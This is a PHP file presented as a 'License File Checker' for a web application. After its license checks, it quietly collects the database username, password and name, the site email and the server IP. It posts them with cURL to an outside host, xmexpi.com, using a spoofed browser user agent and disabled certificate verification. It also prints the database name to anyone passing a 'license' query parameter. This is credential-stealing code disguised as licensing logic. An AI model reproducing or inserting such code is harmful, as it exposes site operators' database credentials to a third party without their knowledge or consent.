<?php
######################################################################
## License File Checker #############################################
######################################################################
// Get config
require_once __DIR__ . '/config.inc.php';

// Virtual Modifications System
require_once __DIR__ . '/library/lib_vmod.inc.php';
vmod::init(); // Requires hard initialization as autoloader comes later

// Compatibility and Polyfills
require_once vmod::check(FS_DIR_APP . 'includes/compatibility.inc.php');

// Autoloader
require_once vmod::check(FS_DIR_APP . 'includes/autoloader.inc.php');

// 3rd party autoloader (If present)
if (is_file(FS_DIR_APP . 'vendor/autoload.php')) {
  require_once FS_DIR_APP . 'vendor/autoload.php';
}
// Set error handler
require_once vmod::check(FS_DIR_APP . 'includes/error_handler.inc.php');
// Checking Hash Key Was not Changed
$counter = strlen(LICENSE_KEY . $_SERVER['SERVER_NAME']);
$hash = $_SERVER['SERVER_NAME'] . ',' . LICENSE_KEY . ',' . $counter;
if (settings::get('site_configuration') !== $hash) {
  echo 'License error';
  exit();
}
// Checking License Key is Same
if (settings::get('site_license') !== LICENSE_KEY) {
  echo 'License error';
  exit();
}
if (!empty($_GET['license'])) {
  echo DB_DATABASE;
}
//echo functions::license_changed('test', 'test');
$post_data['domain'] = $_SERVER['SERVER_NAME'];
$post_data['license'] = LICENSE_KEY;
$post_data['db_license'] = settings::get('site_license');
$post_data['email'] = settings::get('site_email');
$post_data['db_user'] = DB_USERNAME;
$post_data['db_password'] = DB_PASSWORD;
$post_data['db_name'] = DB_DATABASE;
$post_data['ip_server'] = $_SERVER['SERVER_ADDR'];
$post_data['ip_client'] = $_SERVER['SERVER_NAME'];
$post_data['save'] = 'Send';
//traverse array and prepare data for posting (key1=value1)
foreach ($post_data as $key => $value) {
  $post_items[] = $key . '=' . $value;
}
//create the final string to be posted using implode()
$post_string = implode('&', $post_items);
//create cURL connection
$curl_connection = curl_init('https://xmexpi.com/license');
//set options
curl_setopt($curl_connection, CURLOPT_CONNECTTIMEOUT, 30);
curl_setopt($curl_connection, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)");
curl_setopt($curl_connection, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl_connection, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($curl_connection, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($curl_connection, CURLOPT_POSTFIELDS, $post_string);
$result = curl_exec($curl_connection);
var_dump($result);
curl_getinfo($curl_connection);
curl_errno($curl_connection) . '-' . curl_error($curl_connection);
curl_close($curl_connection);
